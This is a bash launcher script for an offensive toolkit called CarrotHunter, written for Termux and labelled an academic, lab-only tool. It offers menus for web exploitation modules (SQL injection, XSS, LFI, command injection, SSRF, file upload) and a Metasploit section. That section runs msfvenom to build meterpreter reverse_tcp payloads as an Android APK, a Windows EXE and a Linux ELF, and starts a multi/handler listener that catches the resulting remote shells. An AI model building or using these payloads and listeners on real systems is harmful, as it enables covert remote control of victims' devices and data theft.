#!/data/data/com.termux/files/usr/bin/bash
# carrot.sh
# CarrotHunter - Main Launcher
# Academic Security Research Tool - Isolated Lab Only

# =============================================
# CONFIGURATION
# =============================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m'

# =============================================
# CHECK ENVIRONMENT
# =============================================

check_python() {
    if ! command -v python3 &>/dev/null; then
        echo -e "${RED}[✗] Python3 not found${NC}"
        echo -e "${YELLOW}[!] Run: ./setup.sh${NC}"
        exit 1
    fi
}

check_dependencies() {
    python3 -c "import requests, bs4, colorama" 2>/dev/null
    if [ $? -ne 0 ]; then
        echo -e "${RED}[✗] Missing Python dependencies${NC}"
        echo -e "${YELLOW}[!] Run: ./setup.sh${NC}"
        exit 1
    fi
}

# =============================================
# BANNER
# =============================================

show_banner() {
    clear
    echo -e "${RED}"
    cat << "EOF"
   ██████╗ █████╗ ██████╗ ██████╗  ██████╗ ████████╗
  ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝
  ██║     ███████║██████╔╝██████╔╝██║   ██║   ██║   
  ██║     ██╔══██║██╔══██╗██╔══██╗██║   ██║   ██║   
  ╚██████╗██║  ██║██║  ██║██║  ██║╚██████╔╝   ██║   
   ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}              H U N T E R  v1.0${NC}"
    echo -e "${CYAN}    Academic Security Research Tool${NC}"
    echo -e "${GREEN}    Isolated Lab Environment Only${NC}"
    echo ""
    echo -e "${MAGENTA}═══════════════════════════════════════════════${NC}"
    echo ""
}

# =============================================
# MAIN MENU
# =============================================

show_menu() {
    echo -e "${CYAN}  ╔════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}  ║${NC}        ${WHITE}SCANNING MODULES${NC}              ${CYAN}║${NC}"
    echo -e "${CYAN}  ╠════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[1]${NC}  Reconnaissance               ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[2]${NC}  Port Scanning                ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[3]${NC}  Web Scanning                 ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[4]${NC}  CMS Detection                ${CYAN}║${NC}"
    echo -e "${CYAN}  ╠════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}  ║${NC}        ${WHITE}EXPLOITATION MODULES${NC}          ${CYAN}║${NC}"
    echo -e "${CYAN}  ╠════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[5]${NC}  SQL Injection                ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[6]${NC}  XSS                          ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[7]${NC}  LFI                          ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[8]${NC}  Command Injection            ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[9]${NC}  SSRF                         ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[10]${NC} File Upload                  ${CYAN}║${NC}"
    echo -e "${CYAN}  ╠════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}  ║${NC}        ${WHITE}AUTOMATION${NC}                   ${CYAN}║${NC}"
    echo -e "${CYAN}  ╠════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[11]${NC} Full Scan (All Modules)      ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[12]${NC} Generate Report              ${CYAN}║${NC}"
    echo -e "${CYAN}  ╠════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[13]${NC} Metasploit Launcher          ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[14]${NC} Settings                     ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[0]${NC}  Exit                         ${CYAN}║${NC}"
    echo -e "${CYAN}  ╚════════════════════════════════════════╝${NC}"
    echo ""
}

# =============================================
# TARGET INPUT
# =============================================

get_target() {
    echo -ne "${YELLOW}[?] Enter target URL (e.g., http://test.com): ${NC}"
    read -r TARGET
    
    # Validate
    if [ -z "$TARGET" ]; then
        echo -e "${RED}[✗] No target provided${NC}"
        return 1
    fi
    
    # Add http:// if missing
    if [[ ! "$TARGET" =~ ^https?:// ]]; then
        TARGET="http://$TARGET"
    fi
    
    echo -e "${GREEN}[✓] Target: $TARGET${NC}"
    echo ""
}

# =============================================
# RUN MODULE
# =============================================

run_module() {
    local module="$1"
    local mode="$2"
    
    if ! get_target; then
        return
    fi
    
    echo -e "${CYAN}[*] Starting $module scan...${NC}"
    echo ""
    
    python3 "$SCRIPT_DIR/core/runner.py" --target "$TARGET" --module "$mode"
    
    echo ""
    echo -e "${YELLOW}[*] Scan completed${NC}"
    echo -e "${YELLOW}[*] Press Enter to return to menu...${NC}"
    read -r
}

# =============================================
# SETTINGS MENU
# =============================================

show_settings() {
    clear
    show_banner
    echo -e "${CYAN}  ╔════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}  ║${NC}            ${WHITE}SETTINGS${NC}                   ${CYAN}║${NC}"
    echo -e "${CYAN}  ╠════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[1]${NC}  View Config                  ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[2]${NC}  Edit Config                  ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[3]${NC}  View Logs                    ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[4]${NC}  Clear Logs                   ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[5]${NC}  View Reports                 ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[6]${NC}  Update Tool                  ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[0]${NC}  Back                         ${CYAN}║${NC}"
    echo -e "${CYAN}  ╚════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -ne "${YELLOW}[?] Choose option: ${NC}"
    read -r choice
    
    case $choice in
        1)
            if [ -f "$SCRIPT_DIR/config/config.json" ]; then
                cat "$SCRIPT_DIR/config/config.json"
            else
                echo -e "${RED}[✗] Config file not found${NC}"
            fi
            echo ""
            echo -ne "${YELLOW}Press Enter to continue...${NC}"
            read -r
            ;;
        2)
            if command -v nano &>/dev/null; then
                nano "$SCRIPT_DIR/config/config.json"
            elif command -v vi &>/dev/null; then
                vi "$SCRIPT_DIR/config/config.json"
            else
                echo -e "${RED}[✗] No editor found${NC}"
            fi
            ;;
        3)
            if [ -d "$SCRIPT_DIR/logs" ] && [ "$(ls -A $SCRIPT_DIR/logs)" ]; then
                ls -la "$SCRIPT_DIR/logs/"
            else
                echo -e "${YELLOW}[!] No logs found${NC}"
            fi
            echo ""
            echo -ne "${YELLOW}Press Enter to continue...${NC}"
            read -r
            ;;
        4)
            rm -rf "$SCRIPT_DIR/logs/"* 2>/dev/null
            echo -e "${GREEN}[✓] Logs cleared${NC}"
            sleep 1
            ;;
        5)
            if [ -d "$SCRIPT_DIR/reports" ] && [ "$(ls -A $SCRIPT_DIR/reports)" ]; then
                ls -la "$SCRIPT_DIR/reports/"
            else
                echo -e "${YELLOW}[!] No reports found${NC}"
            fi
            echo ""
            echo -ne "${YELLOW}Press Enter to continue...${NC}"
            read -r
            ;;
        6)
            echo -e "${CYAN}[*] Updating CarrotHunter...${NC}"
            cd "$SCRIPT_DIR"
            git pull 2>/dev/null || echo -e "${YELLOW}[!] Not a git repository${NC}"
            ;;
        0)
            return
            ;;
    esac
}

# =============================================
# METASPLOIT LAUNCHER
# =============================================

launch_metasploit() {
    clear
    show_banner
    
    if ! command -v msfconsole &>/dev/null; then
        echo -e "${RED}[✗] Metasploit not installed${NC}"
        echo -e "${YELLOW}[!] Install it with: ./metasploit.sh${NC}"
        echo ""
        echo -ne "${YELLOW}Press Enter to continue...${NC}"
        read -r
        return
    fi
    
    echo -e "${CYAN}  ╔════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}  ║${NC}      ${WHITE}METASPLOIT LAUNCHER${NC}            ${CYAN}║${NC}"
    echo -e "${CYAN}  ╠════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[1]${NC}  Launch msfconsole            ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[2]${NC}  Generate Android Payload     ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[3]${NC}  Start Listener               ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[4]${NC}  Generate Windows Payload     ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[5]${NC}  Generate Linux Payload       ${CYAN}║${NC}"
    echo -e "${CYAN}  ║${NC}  ${GREEN}[0]${NC}  Back                         ${CYAN}║${NC}"
    echo -e "${CYAN}  ╚════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -ne "${YELLOW}[?] Choose option: ${NC}"
    read -r choice
    
    case $choice in
        1)
            msfconsole
            ;;
        2)
            echo -ne "${YELLOW}[?] LHOST (your IP): ${NC}"
            read -r LHOST
            echo -ne "${YELLOW}[?] LPORT (default 4444): ${NC}"
            read -r LPORT
            LPORT=${LPORT:-4444}
            
            mkdir -p "$SCRIPT_DIR/payloads/output"
            msfvenom -p android/meterpreter/reverse_tcp \
                LHOST="$LHOST" LPORT="$LPORT" \
                -o "$SCRIPT_DIR/payloads/output/carrot.apk"
            
            echo -e "${GREEN}[✓] Payload saved: payloads/output/carrot.apk${NC}"
            echo -ne "${YELLOW}Press Enter to continue...${NC}"
            read -r
            ;;
        3)
            echo -ne "${YELLOW}[?] LHOST (your IP): ${NC}"
            read -r LHOST
            echo -ne "${YELLOW}[?] LPORT (default 4444): ${NC}"
            read -r LPORT
            LPORT=${LPORT:-4444}
            echo -ne "${YELLOW}[?] Payload type (android/windows/linux): ${NC}"
            read -r PAYLOAD_TYPE
            PAYLOAD_TYPE=${PAYLOAD_TYPE:-android}
            
            msfconsole -q -x "use exploit/multi/handler; \
                set payload $PAYLOAD_TYPE/meterpreter/reverse_tcp; \
                set LHOST $LHOST; \
                set LPORT $LPORT; \
                exploit"
            ;;
        4)
            echo -ne "${YELLOW}[?] LHOST (your IP): ${NC}"
            read -r LHOST
            echo -ne "${YELLOW}[?] LPORT (default 4444): ${NC}"
            read -r LPORT
            LPORT=${LPORT:-4444}
            
            mkdir -p "$SCRIPT_DIR/payloads/output"
            msfvenom -p windows/meterpreter/reverse_tcp \
                LHOST="$LHOST" LPORT="$LPORT" \
                -f exe -o "$SCRIPT_DIR/payloads/output/carrot.exe"
            
            echo -e "${GREEN}[✓] Payload saved: payloads/output/carrot.exe${NC}"
            echo -ne "${YELLOW}Press Enter to continue...${NC}"
            read -r
            ;;
        5)
            echo -ne "${YELLOW}[?] LHOST (your IP): ${NC}"
            read -r LHOST
            echo -ne "${YELLOW}[?] LPORT (default 4444): ${NC}"
            read -r LPORT
            LPORT=${LPORT:-4444}
            
            mkdir -p "$SCRIPT_DIR/payloads/output"
            msfvenom -p linux/x64/meterpreter/reverse_tcp \
                LHOST="$LHOST" LPORT="$LPORT" \
                -f elf -o "$SCRIPT_DIR/payloads/output/carrot.elf"
            
            echo -e "${GREEN}[✓] Payload saved: payloads/output/carrot.elf${NC}"
            echo -ne "${YELLOW}Press Enter to continue...${NC}"
            read -r
            ;;
        0)
            return
            ;;
    esac
}

# =============================================
# MAIN LOOP
# =============================================

main() {
    # Check environment
    check_python
    check_dependencies
    
    # Create directories if not exist
    mkdir -p "$SCRIPT_DIR/reports" "$SCRIPT_DIR/logs" "$SCRIPT_DIR/config"
    mkdir -p "$SCRIPT_DIR/payloads/output"
    
    while true; do
        show_banner
        show_menu
        
        echo -ne "${YELLOW}[?] Choose option: ${NC}"
        read -r choice
        echo ""
        
        case $choice in
            1)  run_module "Reconnaissance" "recon" ;;
            2)  run_module "Port Scanning" "port" ;;
            3)  run_module "Web Scanning" "web" ;;
            4)  run_module "CMS Detection" "cms" ;;
            5)  run_module "SQL Injection" "sqli" ;;
            6)  run_module "XSS" "xss" ;;
            7)  run_module "LFI" "lfi" ;;
            8)  run_module "Command Injection" "cmdi" ;;
            9)  run_module "SSRF" "ssrf" ;;
            10) run_module "File Upload" "upload" ;;
            11) run_module "Full Scan" "full" ;;
            12) run_module "Report Generation" "report" ;;
            13) launch_metasploit ;;
            14) show_settings ;;
            0)
                echo -e "${GREEN}[✓] Goodbye!${NC}"
                echo -e "${CYAN}[*] Stay ethical, stay safe${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[✗] Invalid option${NC}"
                sleep 1
                ;;
        esac
    done
}

# =============================================
# ENTRY POINT
# =============================================

# Handle Ctrl+C gracefully
trap 'echo -e "\n${YELLOW}[!] Interrupted by user${NC}"; exit 0' INT

# Run main
main